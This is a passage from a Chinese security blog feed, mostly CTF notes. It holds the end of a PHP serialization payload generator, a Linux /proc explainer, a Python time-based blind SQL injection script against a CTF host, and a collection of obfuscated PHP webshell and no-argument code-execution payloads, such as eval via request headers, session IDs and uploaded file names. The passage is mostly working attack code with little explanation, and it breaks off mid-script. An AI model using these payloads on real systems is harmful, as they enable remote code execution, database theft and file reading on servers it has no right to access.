class="hljs-string">&#x27;user_agent&#x27;</span>=&gt;<span class="hljs-string">&#x27;wupco^^&#x27;</span>.join(<span class="hljs-string">&#x27;^^&#x27;</span>,<span class="hljs-variable">$headers</span>).<span class="hljs-string">&#x27;^^Content-Length: &#x27;</span>.(string)strlen(<span class="hljs-variable">$post_string</span>).<span class="hljs-string">&#x27;^^^^&#x27;</span>.<span class="hljs-variable">$post_string</span>,<span class="hljs-string">&#x27;uri&#x27;</span>=&gt; <span class="hljs-string">&quot;aaab&quot;</span>));    &#125;&#125;<span class="hljs-variable">$a</span> = new HelloWorld_DB();<span class="hljs-variable">$aaa</span> = serialize(<span class="hljs-variable">$a</span>);<span class="hljs-variable">$aaa</span> = str_replace(<span class="hljs-string">&#x27;^^&#x27;</span>,<span class="hljs-string">&quot;\r\n&quot;</span>,<span class="hljs-variable">$aaa</span>);<span class="hljs-variable">$aaa</span> = str_replace(<span class="hljs-string">&#x27;&amp;&#x27;</span>,<span class="hljs-string">&#x27;&amp;&#x27;</span>,<span class="hljs-variable">$aaa</span>);echo base64_encode(<span class="hljs-variable">$aaa</span>);</code></pre></code></pre></li></ol><p>#Not So Web Application</p><p>这个逆向 我天</p>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>MRCTF2020</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Linux下的/proc目录介绍</title>
    <link href="/2020/03/29/Linux%E4%B8%8B%E7%9A%84-proc%E7%9B%AE%E5%BD%95%E4%BB%8B%E7%BB%8D/"/>
    <url>/2020/03/29/Linux%E4%B8%8B%E7%9A%84-proc%E7%9B%AE%E5%BD%95%E4%BB%8B%E7%BB%8D/</url>
    
    <content type="html"><![CDATA[<blockquote><p>转载 <a href="https://www.cnblogs.com/zydev/p/8728992.html">https://www.cnblogs.com/zydev/p/8728992.html</a></p></blockquote><p>   proc被称为虚拟文件系统，它是一个控制中心，可以通过更改其中某些文件改变内核运行状态，</p><p>它也是内核提空给我们的查询中心，用户可以通过它查看系统硬件及当前运行的进程信息。</p><p>Linux中许多工具的数据来源正是proc目录中的内容，比如lsmod的命令是cat /proc/modules的别名。</p><h4 id="proc目录下常用文件介绍："><a href="#proc目录下常用文件介绍：" class="headerlink" title="/proc目录下常用文件介绍："></a>/proc目录下常用文件介绍：</h4><ul><li>/proc/loadavg   前三列分别保存最近1分钟，5分钟，及15分钟的平均负载。</li><li>/proc/meminfo  当前内存使用信息</li><li>/proc/diskstats  磁盘I/O统计信息列表</li><li>/proc/net/dev   网络流入流出统计信息</li><li>/proc/filesystems 支持的文件系统</li><li>/proc/cpuinfo    CPU的详细信息</li><li>/proc/cmdline   启动时传递至内核的启动参数，通常由grub进行传递</li><li>/proc/mounts   系统当前挂在的文件系统</li><li>/proc/uptime  系统运行时间</li><li>/poc/version   当前运行的内核版本号等信息</li><li>/proc/self/environ  环境变量</li><li>/proc/self/cmdline </li></ul><h4 id="进程目录下常用文件介绍"><a href="#进程目录下常用文件介绍" class="headerlink" title="进程目录下常用文件介绍"></a>进程目录下常用文件介绍</h4><p>cmdline,保存了当前进程的启动命令</p><p><img src="https://images2018.cnblogs.com/blog/789733/201804/789733-20180406212313695-423138253.png" alt="img"></p><p>cwd：一个符号链接，执行进程的运行目录</p><p><img src="https://images2018.cnblogs.com/blog/789733/201804/789733-20180406212559395-1513808298.png" alt="img"></p><p>exe： exe是一个软链接，指向进程的可执行文件，通过它可以启动当前进程的一个拷贝</p><p><img src="https://images2018.cnblogs.com/blog/789733/201804/789733-20180406212806649-397861829.png" alt="img"></p><p>environ: 当前进程关联的环境变量。</p><p><img src="https://images2018.cnblogs.com/blog/789733/201804/789733-20180406212938229-1174900092.png" alt="img"></p><p>fd: 包含了进程打开的每一个文件的文件描述符，这些描述符是指向实际文件的符号链接。可以通过它恢复删除的文件</p><p><img src="https://images2018.cnblogs.com/blog/789733/201804/789733-20180406213432989-1878127616.png" alt="img"></p>]]></content>
    
    
    <categories>
      
      <category>LINUX</category>
      
    </categories>
    
    
    <tags>
      
      <tag>/proc</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>[SWPU2019]Web4</title>
    <link href="/2020/03/26/SWPU2019-Web4/"/>
    <url>/2020/03/26/SWPU2019-Web4/</url>
    
    <content type="html"><![CDATA[<pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<span class="hljs-keyword">import</span> time<span class="hljs-function"><span class="hljs-keyword">def</span> <span class="hljs-title">str_to_hex</span>(<span class="hljs-params">s</span>):</span>    <span class="hljs-keyword">return</span> <span class="hljs-string">&#x27;&#x27;</span>.join([<span class="hljs-built_in">hex</span>(<span class="hljs-built_in">ord</span>(c)).replace(<span class="hljs-string">&#x27;0x&#x27;</span>, <span class="hljs-string">&#x27;&#x27;</span>) <span class="hljs-keyword">for</span> c <span class="hljs-keyword">in</span> s])url = <span class="hljs-string">&#x27;http://74bef70e-60ce-4bc7-b5e4-b30fb4911c9a.node3.buuoj.cn/index.php?r=Login/Login&#x27;</span>payload = &#123;<span class="hljs-string">&quot;username&quot;</span>:<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-string">&quot;password&quot;</span>:<span class="hljs-string">&quot;123&quot;</span>&#125;<span class="hljs-comment"># print(requests.post(url,data=payload).text)</span>x=<span class="hljs-string">&quot;&quot;</span>database=<span class="hljs-string">&quot;database()&quot;</span><span class="hljs-comment">#</span>table =<span class="hljs-string">&quot;(select group_concat(table_name) from information_schema.tables where table_schema regexp database())&quot;</span>column=<span class="hljs-string">&quot;(select group_concat(column_name) from information_schema.columns where table_name=0x7573657273 and table_schema=database())&quot;</span>data = <span class="hljs-string">&quot;(select group_concat(flag) from flag)&quot;</span><span class="hljs-keyword">for</span> Len <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">1</span>,<span class="hljs-number">50</span>):    <span class="hljs-built_in">max</span> = <span class="hljs-number">127</span>    <span class="hljs-built_in">min</span> = <span class="hljs-number">33</span>    <span class="hljs-keyword">while</span> <span class="hljs-built_in">max</span> &gt;= <span class="hljs-built_in">min</span>:        mid = (<span class="hljs-built_in">max</span> + <span class="hljs-built_in">min</span>) // <span class="hljs-number">2</span>        <span class="hljs-built_in">str</span>=<span class="hljs-string">&quot;select if((ascii(substr(&#123;&#125;,&#123;&#125;,1))&gt;&#123;&#125;),sleep(1),1)&quot;</span>.<span class="hljs-built_in">format</span>(data,Len,mid)        <span class="hljs-built_in">str</span>=<span class="hljs-string">&quot;0x&quot;</span>+str_to_hex(<span class="hljs-built_in">str</span>)        pay = payload        pay[<span class="hljs-string">&quot;username&quot;</span>]=<span class="hljs-string">&quot;ss\&#x27;;SET @a=&#123;&#125;;PREPARE test FROM @a;EXECUTE test;&quot;</span>.<span class="hljs-built_in">format</span>(<span class="hljs-built_in">str</span>)        <span class="hljs-comment"># print(pay)</span>        before_time = time.time()        r = requests.post(url,json=pay)        after_time = time.time()        <span class="hljs-comment"># print( r.text)</span>        offset = after_time-before_time        <span class="hljs-comment"># print(offset)</span>        <span class="hljs-keyword">if</span> (offset&gt;<span class="hljs-number">1</span>):            <span class="hljs-built_in">min</span> = mid + <span class="hljs-number">1</span>        <span class="hljs-keyword">else</span>:            <span class="hljs-built_in">max</span> = mid        <span class="hljs-keyword">if</span> <span class="hljs-built_in">max</span> == mid == <span class="hljs-built_in">min</span>:            x += <span class="hljs-built_in">chr</span>(mid)            print(x)            <span class="hljs-keyword">break</span></code></pre>]]></content>
    
    
    <categories>
      
      <category>CTF</category>
      
    </categories>
    
    
    <tags>
      
      <tag>SWPU2019</tag>
      
      <tag>SQL预编译+时间盲注+代码审计</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>无字母数字webshell</title>
    <link href="/2020/03/16/%E6%97%A0%E5%AD%97%E7%AC%A6webshell%E6%94%B6%E9%9B%86/"/>
    <url>/2020/03/16/%E6%97%A0%E5%AD%97%E7%AC%A6webshell%E6%94%B6%E9%9B%86/</url>
    
    <content type="html"><![CDATA[<blockquote><p>收集一下平时用的payload</p></blockquote><h1 id="无字符"><a href="#无字符" class="headerlink" title="无字符"></a>无字符</h1><pre><code class="hljs xquery">?code=<span class="hljs-variable">$_</span>=<span class="hljs-string">&quot;`&#123;&#123;&#123;&quot;</span>^<span class="hljs-string">&quot;?&lt;&gt;/&quot;</span>;;$&#123;<span class="hljs-variable">$_</span>&#125;[<span class="hljs-number">_</span>]($&#123;<span class="hljs-variable">$_</span>&#125;[_<span class="hljs-number">_</span>]);&amp;<span class="hljs-number">_</span>=assert&amp;_<span class="hljs-number">_</span>=执行的命令   // _GET?code=(~<span class="hljs-meta">%9E</span><span class="hljs-meta">%8C</span><span class="hljs-meta">%8C</span><span class="hljs-meta">%9A</span><span class="hljs-meta">%8D</span><span class="hljs-meta">%8B</span>)((~<span class="hljs-meta">%91</span><span class="hljs-meta">%9A</span><span class="hljs-meta">%87</span><span class="hljs-meta">%8B</span>)((~<span class="hljs-meta">%98</span><span class="hljs-meta">%9A</span><span class="hljs-meta">%8B</span><span class="hljs-meta">%9E</span><span class="hljs-meta">%93</span><span class="hljs-meta">%93</span><span class="hljs-meta">%97</span><span class="hljs-meta">%9A</span><span class="hljs-meta">%9E</span><span class="hljs-meta">%9B</span><span class="hljs-meta">%9A</span><span class="hljs-meta">%8D</span><span class="hljs-meta">%8C</span>)()));//(<span class="hljs-string">&quot;assert&quot;</span>)((<span class="hljs-string">&quot;next&quot;</span>)((<span class="hljs-string">&quot;getallheaders&quot;</span>)())); 取反操作！在UA头里面添加命令</code></pre><p><img src="https://s1.ax1x.com/2020/04/24/JD8ZMq.png" alt="JD8ZMq.png"></p><p>利用缓存文件</p><p><a href="https://xz.aliyun.com/t/7742">https://xz.aliyun.com/t/7742</a></p><h1 id="无参数"><a href="#无参数" class="headerlink" title="无参数"></a>无参数</h1><ul><li><p>getallheaders()</p><pre><code class="hljs isbl"><span class="hljs-function"><span class="hljs-title">eval</span>(<span class="hljs-title">end</span>(<span class="hljs-title">getallheaders</span>()));</span><span class="hljs-function">添加头部</span><span class="hljs-function"><span class="hljs-variable">GS</span>: <span class="hljs-title">system</span>(<span class="hljs-string">&quot;ls /&quot;</span>);</span></code></pre></li><li><p>get_defined_vars()</p><p>限制：apache的函数</p><pre><code class="hljs routeros">可以回显全局变量<span class="hljs-variable">$_GET</span><span class="hljs-variable">$_POST</span><span class="hljs-variable">$_FILES</span><span class="hljs-variable">$_COOKIE</span>利用<span class="hljs-variable">$_GET</span>eval(end(current(get_defined_vars())))同时get传一个 <span class="hljs-attribute">GS</span>=phpinfo()也可以利用<span class="hljs-variable">$_FILES</span>import requests<span class="hljs-keyword">from</span> io import BytesIOpayload = <span class="hljs-string">&quot;system(&#x27;ls /tmp&#x27;);&quot;</span>.encode(<span class="hljs-string">&#x27;hex&#x27;</span>)files = &#123;  payload: BytesIO(<span class="hljs-string">&#x27;sky cool!&#x27;</span>)&#125;r = requests.post(<span class="hljs-string">&#x27;http://localhost/skyskysky.php?code=eval(hex2bin(array_rand(end(get_defined_vars()))));&#x27;</span>, <span class="hljs-attribute">files</span>=files, <span class="hljs-attribute">allow_redirects</span>=<span class="hljs-literal">False</span>)<span class="hljs-builtin-name">print</span> r.content</code></pre></li><li><p>session_id()</p><pre><code class="hljs routeros">import requestsurl = <span class="hljs-string">&#x27;http://localhost/?code=eval(hex2bin(session_id(session_start())));&#x27;</span>payload = <span class="hljs-string">&quot;echo &#x27;sky cool&#x27;;&quot;</span>.encode(<span class="hljs-string">&#x27;hex&#x27;</span>)cookies = &#123;<span class="hljs-string">&#x27;PHPSESSID&#x27;</span>:payload&#125;r = requests.<span class="hljs-builtin-name">get</span>(<span class="hljs-attribute">url</span>=url,cookies=cookies)<span class="hljs-builtin-name">print</span> r.content</code></pre></li><li><p>越目录读文件</p><pre><code class="hljs mel">var_dump(scandir(<span class="hljs-keyword">dirname</span>(<span class="hljs-keyword">dirname</span>(<span class="hljs-keyword">dirname</span>(getcwd())))))var_dump(scandir(<span class="hljs-keyword">dirname</span>(getcwd())));  上层目录  <span class="hljs-keyword">dirname</span><span class="hljs-keyword">chdir</span>(<span class="hljs-keyword">dirname</span>(getcwd()));              更改目录  <span class="hljs-keyword">chdir</span>读根目录# 返回一个点<span class="hljs-keyword">dirname</span>(<span class="hljs-keyword">chdir</span>(<span class="hljs-keyword">dirname</span>(getcwd())))# 这个太厉害了current(localeconv())   chr(<span class="hljs-keyword">ceil</span>(sinh(cosh(<span class="hljs-keyword">tan</span>(<span class="hljs-keyword">floor</span>(<span class="hljs-keyword">sqrt</span>(<span class="hljs-keyword">floor</span>(phpversion()))))))))(<span class="hljs-keyword">chdir</span>(next(scandir(current(localeconv())))))  切换到上一个目录(<span class="hljs-keyword">chdir</span>(next(scandir(chr(pos(localtime(time(<span class="hljs-keyword">chdir</span>(next(scandir(current(localeconv())))))))))))) 切换到上上个目录(<span class="hljs-keyword">chdir</span>(next(scandir(chr(pos(localtime(time())))))))  套这个就完事# 读文件<span class="hljs-keyword">chdir</span>可以切换下目录，然后获取到文件名直接读就行show_source(array_rand(array_flip(scandir(<span class="hljs-keyword">dirname</span>(<span class="hljs-keyword">chdir</span>(<span class="hljs-keyword">dirname</span>(<span class="hljs-keyword">dirname</span>(<span class="hljs-keyword">dirname</span>(getcwd())))))))))array_rand 随机取array_flip 键值倒过来</code></pre></li></ul><p>参考 ：</p><p><a href="https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/">https://skysec.top/2019/03/29/PHP-Parametric-Function-RCE/</a></p><p><a href="https://www.gem-love.com/ctf/530.html">https://www.gem-love.com/ctf/530.html</a></p><p><a href="https://www.jianshu.com/p/060d16584b8e">https://www.jianshu.com/p/060d16584b8e</a></p><p><a href="https://mp.weixin.qq.com/s/mUND1lhNWIufouL4bH1o0g">https://mp.weixin.qq.com/s/mUND1lhNWIufouL4bH1o0g</a></p><h1 id="添加一些奇奇怪怪的shell"><a href="#添加一些奇奇怪怪的shell" class="headerlink" title="添加一些奇奇怪怪的shell"></a>添加一些奇奇怪怪的shell</h1><p>RCTF2020Calc  <a href="https://blog.rois.io/2020/rctf-2020-official-writeup/">https://blog.rois.io/2020/rctf-2020-official-writeup/</a></p><pre><code class="hljs php"><span class="hljs-comment"># system(end(getallheaders()));</span><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$a</span> =<span class="hljs-string">&#x27;&#x27;</span>;<span class="hljs-variable">$a</span> .= ((((<span class="hljs-number">10000000000000000000</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">3</span>&#125;)&amp;(~(((<span class="hljs-number">1</span>).(<span class="hljs-number">7</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))&#123;<span class="hljs-number">1</span>&#125;))|(((<span class="hljs-number">1</span>).(<span class="hljs-number">3</span>))&#123;<span class="hljs-number">1</span>&#125;));<span class="hljs-variable">$a</span> .= ((((<span class="hljs-number">10000000000000000000</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">3</span>&#125;)&amp;(~(((<span class="hljs-number">1</span>).(<span class="hljs-number">7</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))&#123;<span class="hljs-number">1</span>&#125;))|(((<span class="hljs-number">1</span>).(<span class="hljs-number">9</span>))&#123;<span class="hljs-number">1</span>&#125;));<span class="hljs-variable">$a</span> .= ((((<span class="hljs-number">10000000000000000000</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">3</span>&#125;)&amp;(~(((<span class="hljs-number">1</span>).(<span class="hljs-number">7</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))&#123;<span class="hljs-number">1</span>&#125;))|(((<span class="hljs-number">1</span>).(<span class="hljs-number">3</span>))&#123;<span class="hljs-number">1</span>&#125;));<span class="hljs-variable">$a</span> .= ((((<span class="hljs-number">10000000000000000000</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">3</span>&#125;)&amp;(~(((<span class="hljs-number">1</span>).(<span class="hljs-number">7</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))&#123;<span class="hljs-number">1</span>&#125;))|(((<span class="hljs-number">1</span>).(<span class="hljs-number">4</span>))&#123;<span class="hljs-number">1</span>&#125;));<span class="hljs-variable">$a</span> .= (((<span class="hljs-number">10000000000000000000</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">3</span>&#125;);<span class="hljs-variable">$a</span> .= ((((<span class="hljs-number">10000000000000000000</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">3</span>&#125;)|(((<span class="hljs-number">-1</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">0</span>&#125;));<span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>; <span class="hljs-comment">//systEm</span><span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?php</span> <span class="hljs-variable">$a</span> =<span class="hljs-string">&#x27;&#x27;</span>;<span class="hljs-variable">$a</span> .= (((<span class="hljs-number">10000000000000000000</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">3</span>&#125;); <span class="hljs-comment">// E</span><span class="hljs-variable">$a</span> .= (((((<span class="hljs-number">10000000000000000000</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">3</span>&#125;)|(((<span class="hljs-number">1.1</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">1</span>&#125;))&amp;((~(((<span class="hljs-number">1</span>).(<span class="hljs-number">7</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))&#123;<span class="hljs-number">1</span>&#125;))|(((<span class="hljs-number">1</span>).(<span class="hljs-number">6</span>))&#123;<span class="hljs-number">1</span>&#125;))); <span class="hljs-comment">//n</span><span class="hljs-variable">$a</span> .= ((((<span class="hljs-number">10000000000000000000</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">3</span>&#125;)&amp;((~(((<span class="hljs-number">1</span>).(<span class="hljs-number">7</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))&#123;<span class="hljs-number">1</span>&#125;))|(((<span class="hljs-number">1</span>).(<span class="hljs-number">6</span>))&#123;<span class="hljs-number">1</span>&#125;))); <span class="hljs-comment">//D</span><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>; <span class="hljs-comment">//EnD</span><span class="hljs-meta">?&gt;</span><span class="hljs-meta">&lt;?php</span> <span class="hljs-comment">// getallheaders</span><span class="hljs-variable">$a</span> =<span class="hljs-string">&#x27;&#x27;</span>;<span class="hljs-variable">$a</span> .= ((((<span class="hljs-number">10000000000000000000</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">3</span>&#125;)|(((<span class="hljs-number">1.1</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">1</span>&#125;)&amp;((~(((<span class="hljs-number">1</span>).(<span class="hljs-number">8</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">1</span>).(<span class="hljs-number">7</span>))&#123;<span class="hljs-number">1</span>&#125;)))); <span class="hljs-comment">// g</span><span class="hljs-variable">$a</span> .= (((<span class="hljs-number">10000000000000000000</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">3</span>&#125;); <span class="hljs-comment">// E</span><span class="hljs-variable">$a</span> .= ((((<span class="hljs-number">10000000000000000000</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">3</span>&#125;)&amp;(~(((<span class="hljs-number">1</span>).(<span class="hljs-number">7</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))&#123;<span class="hljs-number">1</span>&#125;))|(((<span class="hljs-number">1</span>).(<span class="hljs-number">4</span>))&#123;<span class="hljs-number">1</span>&#125;)); <span class="hljs-comment">//T</span><span class="hljs-variable">$a</span> .= ((((<span class="hljs-number">10000000000000000000</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">3</span>&#125;)&amp;((~(((<span class="hljs-number">1</span>).(<span class="hljs-number">7</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))&#123;<span class="hljs-number">1</span>&#125;))|(((<span class="hljs-number">1</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">1</span>&#125;))); <span class="hljs-comment">//a</span><span class="hljs-variable">$a</span> .= (((((<span class="hljs-number">10000000000000000000</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">3</span>&#125;)|(((<span class="hljs-number">1.1</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">1</span>&#125;))&amp;((~(((<span class="hljs-number">1</span>).(<span class="hljs-number">7</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))&#123;<span class="hljs-number">1</span>&#125;))|(((<span class="hljs-number">1</span>).(<span class="hljs-number">4</span>))&#123;<span class="hljs-number">1</span>&#125;))); <span class="hljs-comment">// l</span><span class="hljs-variable">$a</span> .= (((((<span class="hljs-number">10000000000000000000</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">3</span>&#125;)|(((<span class="hljs-number">1.1</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">1</span>&#125;))&amp;((~(((<span class="hljs-number">1</span>).(<span class="hljs-number">7</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))&#123;<span class="hljs-number">1</span>&#125;))|(((<span class="hljs-number">1</span>).(<span class="hljs-number">4</span>))&#123;<span class="hljs-number">1</span>&#125;))); <span class="hljs-comment">// l</span><span class="hljs-variable">$a</span> .= (((((<span class="hljs-number">10000000000000000000</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">3</span>&#125;)|(((<span class="hljs-number">1.1</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">1</span>&#125;))&amp;((~(((<span class="hljs-number">1</span>).(<span class="hljs-number">7</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))&#123;<span class="hljs-number">1</span>&#125;))|(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))&#123;<span class="hljs-number">1</span>&#125;))); <span class="hljs-comment">// h</span><span class="hljs-variable">$a</span> .= (((<span class="hljs-number">10000000000000000000</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">3</span>&#125;); <span class="hljs-comment">// E</span><span class="hljs-variable">$a</span> .= ((((<span class="hljs-number">10000000000000000000</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">3</span>&#125;)&amp;((~(((<span class="hljs-number">1</span>).(<span class="hljs-number">7</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))&#123;<span class="hljs-number">1</span>&#125;))|(((<span class="hljs-number">1</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">1</span>&#125;))); <span class="hljs-comment">//a</span><span class="hljs-variable">$a</span> .= ((((<span class="hljs-number">10000000000000000000</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">3</span>&#125;)&amp;((~(((<span class="hljs-number">1</span>).(<span class="hljs-number">7</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))&#123;<span class="hljs-number">1</span>&#125;))|(((<span class="hljs-number">1</span>).(<span class="hljs-number">4</span>))&#123;<span class="hljs-number">1</span>&#125;))); <span class="hljs-comment">//D</span><span class="hljs-variable">$a</span> .= (((<span class="hljs-number">10000000000000000000</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">3</span>&#125;); <span class="hljs-comment">// E</span><span class="hljs-variable">$a</span> .= ((((<span class="hljs-number">10000000000000000000</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">3</span>&#125;)&amp;(~(((<span class="hljs-number">1</span>).(<span class="hljs-number">7</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))&#123;<span class="hljs-number">1</span>&#125;))|(((<span class="hljs-number">1</span>).(<span class="hljs-number">2</span>))&#123;<span class="hljs-number">1</span>&#125;)); <span class="hljs-comment">// r</span><span class="hljs-variable">$a</span> .= ((((<span class="hljs-number">10000000000000000000</span>).(<span class="hljs-number">1</span>))&#123;<span class="hljs-number">3</span>&#125;)&amp;(~(((<span class="hljs-number">1</span>).(<span class="hljs-number">7</span>))&#123;<span class="hljs-number">1</span>&#125;)|(((<span class="hljs-number">1</span>).(<span class="hljs-number">0</span>))&#123;<span class="hljs-number">1</span>&#125;))|(((<span class="hljs-number">1</span>).(<span class="hljs-number">3</span>))&#123;<span class="hljs-number">1</span>&#125;)); <span class="hljs-comment">// s</span><span class="hljs-keyword">echo</span> <span class="hljs-variable">$a</span>;<span class="hljs-meta">?&gt;</span></code></pre><p>利用1/0构造的,还可以构造这样 <code>system(file_get_contents(“php://input”)); </code></p><pre><code class="hljs php"><span class="hljs-comment">#得到字符脚本</span>chrs = <span class="hljs-string">&quot;INF0123456789-.&quot;</span>result = <span class="hljs-keyword">list</span>(chrs)recipes = [];<span class="hljs-literal">null</span> = Nonerecipes.append(&#123;<span class="hljs-string">&quot;char&quot;</span>:<span class="hljs-string">&quot;I&quot;</span>,<span class="hljs-string">&quot;first&quot;</span>:<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;second&quot;</span>:<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;method&quot;</span>:<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;make&quot;</span>:<span class="hljs-string">&quot;(((1/0).(0))&#123;0&#125;)&quot;</span>&#125;);recipes.append(&#123;<span class="hljs-string">&quot;char&quot;</span>:<span class="hljs-string">&quot;N&quot;</span>,<span class="hljs-string">&quot;first&quot;</span>:<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;second&quot;</span>:<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;method&quot;</span>:<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;make&quot;</span>:<span class="hljs-string">&quot;(((1/0).(0))&#123;1&#125;)&quot;</span>&#125;);recipes.append(&#123;<span class="hljs-string">&quot;char&quot;</span>:<span class="hljs-string">&quot;F&quot;</span>,<span class="hljs-string">&quot;first&quot;</span>:<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;second&quot;</span>:<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;method&quot;</span>:<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;make&quot;</span>:<span class="hljs-string">&quot;(((1/0).(0))&#123;2&#125;)&quot;</span>&#125;);recipes.append(&#123;<span class="hljs-string">&quot;char&quot;</span>:<span class="hljs-string">&quot;0&quot;</span>,<span class="hljs-string">&quot;first&quot;</span>:<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;second&quot;</span>:<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;method&quot;</span>:<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;make&quot;</span>:<span class="hljs-string">&quot;(((0).(0))&#123;0&#125;)&quot;</span>&#125;);recipes.append(&#123;<span class="hljs-string">&quot;char&quot;</span>:<span class="hljs-string">&quot;1&quot;</span>,<span class="hljs-string">&quot;first&quot;</span>:<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;second&quot;</span>:<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;method&quot;</span>:<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;make&quot;</span>:<span class="hljs-string">&quot;(((1).(0))&#123;0&#125;)&quot;</span>&#125;);recipes.append(&#123;<span class="hljs-string">&quot;char&quot;</span>:<span class="hljs-string">&quot;2&quot;</span>,<span class="hljs-string">&quot;first&quot;</span>:<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;second&quot;</span>:<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;method&quot;</span>:<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;make&quot;</span>:<span class="hljs-string">&quot;(((2).(0))&#123;0&#125;)&quot;</span>&#125;);recipes.append(&#123;<span class="hljs-string">&quot;char&quot;</span>:<span class="hljs-string">&quot;3&quot;</span>,<span class="hljs-string">&quot;first&quot;</span>:<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;second&quot;</span>:<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;method&quot;</span>:<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;make&quot;</span>:<span class="hljs-string">&quot;(((3).(0))&#123;0&#125;)&quot;</span>&#125;);recipes.append(&#123;<span class="hljs-string">&quot;char&quot;</span>:<span class="hljs-string">&quot;4&quot;</span>,<span class="hljs-string">&quot;first&quot;</span>:<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;second&quot;</span>:<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;method&quot;</span>:<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;make&quot;</span>:<span class="hljs-string">&quot;(((4).(0))&#123;0&#125;)&quot;</span>&#125;);recipes.append(&#123;<span class="hljs-string">&quot;char&quot;</span>:<span class="hljs-string">&quot;5&quot;</span>,<span class="hljs-string">&quot;first&quot;</span>:<span class="hljs-literal">null</span>,<span class="hljs-string">&quot;second&quot;</span>:<span class="hljs-literal">null</span>,<span 